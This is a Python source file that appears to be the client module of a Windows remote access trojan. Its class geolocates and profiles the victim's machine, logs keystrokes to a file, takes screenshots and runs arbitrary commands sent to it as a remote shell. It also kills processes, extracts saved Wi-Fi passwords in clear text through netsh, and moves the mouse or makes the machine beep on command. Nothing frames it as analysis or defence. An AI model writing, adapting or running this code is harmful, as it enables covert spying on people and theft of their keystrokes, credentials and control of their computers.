from time import sleep
import requests
import platform
import socket
import pyautogui
import os
import subprocess
import psutil
import win32api
from pynput.keyboard import Key, Listener
from getpass import getuser
from util import Console

test_konumu = f"C:\\Users\\{getuser()}\\Desktop\\"
class ClientCommands:
    def __init__(self):
        super().__init__()

    def get_info(self) -> dict:
        __url = "http://ip-api.com/json/?fields=61439"
        __response = requests.get(__url).json()
        data = {"INFO":{"Country" :__response["country"],"Country-Code" :__response["countryCode"],"Region-Name":__response["regionName"],"City":__response["city"],
                        "Lat" :__response["lat"],"Lon": __response["lon"],"Time-Zone":__response["timezone"],"IP":__response["query"],
                        "IPv4":socket.gethostbyname(socket.gethostname())},
                "SYSTEM":{"OS":platform.platform(),"Node":platform.node(),
                          "Machine-Type":platform.machine(),"Processor":platform.processor(),
                          "Core": os.cpu_count(),
                          "Altair-in-here":os.getcwd()}}
        return data
        
    def on_press(self,key):
        letters = str(key)
        letters = letters.replace("'","")
        if key == Key.space:
            letters = " "
        if key == Key.enter:
            letters = "\n"
        if key == Key.shift_l or key == Key.shift_r:
            letters.upper()
        if key == Key.esc:
            letters = ""
        with open("log.txt","a",encoding="utf-8") as f:
            f.write(letters)

    def on_release(self,key):
        if key == Key.esc:
            return False

    def makeKeylogger(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def screenShot(self):
        pyautogui.screenshot().save(f"{test_konumu}ss.png")
    
    def terminalCommands(self,c:str):
        try:
            if c.startswith("kill"):
                splitter_kill = c.split()
                splitter_kill.remove("kill")
                if len(splitter_kill) > 1:
                    return f"\t\t{Console.CYAN}╰──/{Console.RED}Only One Argument\n".expandtabs(7)
                else:
                    return os.popen(f"taskkill /im {splitter_kill[0]} /f").read()
            else:
                if c == "help":
                    HELPER = f"""\t{Console.CYAN}╰──/{Console.DEFAULT}get-apps{Console.CYAN:<11} [{Console.GREEN}GET-ALL-APP-NAME{Console.CYAN}]
\t╰──/{Console.DEFAULT}kill{Console.CYAN:<15} [{Console.GREEN}CLOSE-APP{Console.CYAN}]
\t╰──/{Console.DEFAULT}get-wifi-passw{Console.CYAN} [{Console.GREEN}GET-SAVED-WIFI-PASSWORDS{Console.CYAN}]
\t╰──/{Console.DEFAULT}e--{Console.CYAN:<16} [{Console.GREEN}EXIT-SHELL{Console.CYAN}]""".expandtabs(14)
                    return HELPER
                elif c == "get-apps":
                    return "\n".join(f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{p.name()}".expandtabs(7) for p in psutil.process_iter())
                elif c == "get-wifi-passw":
                    return self.wifiChecked()
                elif c == "e--":
                    os.system("exit")
                else:
                    return f"\t\t{Console.CYAN}╰──/{Console.YELLOW}{os.popen(c).read()}".expandtabs(7)
        except IndexError:
            return " "

    def wifiChecked(self):
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        strings = ""
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                strings += f"\t{Console.CYAN}╰──/{Console.DEFAULT}{i:<25} {Console.CYAN}⥤  {results[0]:<}\n".expandtabs(14)
            except subprocess.CalledProcessError:
                strings += f"\t{Console.CYAN}╰──/{Console.DEFAULT}{i:<25} {Console.CYAN}⥤  {'ENCODING ERROR':<}\n".expandtabs(14)
        return strings

    def winManupilation(self,cmd):
        try:
            HELPER = f"""\t{Console.CYAN}╰──/{Console.DEFAULT}m.pos x=arg1 y=arg2{Console.CYAN} ⥤  [{Console.GREEN}Set Mouse Position{Console.CYAN}]
            \t{Console.CYAN}╰──/{Console.DEFAULT}beep hz=arg1 sec=arg2 loop=bool""".expandtabs(14)
            if cmd == "help":
                return HELPER
            elif cmd.startswith("m.pos "):
                msg_splitter = cmd.split()
                if len(msg_splitter) == 3:
                    msg_splitter.remove("m.pos")
                    win32api.SetCursorPos((int(msg_splitter[0].replace("x=","")),int(msg_splitter[1].replace("y=",""))))
                    x, y = win32api.GetCursorPos()
                    return f"x={x}, y={y}"
                else:
                    return "Uups! Syntax"
            elif cmd.startswith("beep "):
                beeper = cmd.split()
                if len(beeper) == 4:
                    beeper.remove("beep")
                    count = 0
                    int(beeper[1].replace("sec=",""))
                    print(beeper[2].replace("loop=","").capitalize())
                    if beeper[2].replace("loop=","").capitalize() == "True":
                        while count < 10:
                            win32api.Beep(int(beeper[0].replace("hz=","")), int(beeper[1].replace("sec=","")))
                            sleep(int(beeper[1].replace("sec=",""))/1000)
                            count += 1

                    elif beeper[2].replace("loop=","").capitalize() == "False":
                        win32api.Beep(int(beeper[0].replace("hz=","")), int(beeper[1].replace("sec=","")))
                else:
                    return "Uups! Syntax"
            else:
                return "Unknown command"
        except Exception:
            return " "